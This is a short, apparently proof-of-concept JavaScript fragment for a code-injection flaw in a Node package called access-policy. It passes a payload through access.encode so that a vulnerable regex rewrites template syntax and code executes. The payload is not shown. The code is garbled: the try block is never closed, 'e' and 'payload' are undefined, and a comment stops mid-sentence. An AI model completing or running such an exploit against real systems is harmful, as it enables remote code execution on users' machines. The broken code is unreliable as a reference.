// node_modules/access-policy/lib/encode.js:

// "${...}" -> rewritten to "${data...." by the vulnerable regex, so we build

const statements = [{ action: payload }];

try {
  const result = access.encode(statements, {});

  console.log("Post-RCE parse noise (exploit already ran):", e.message);
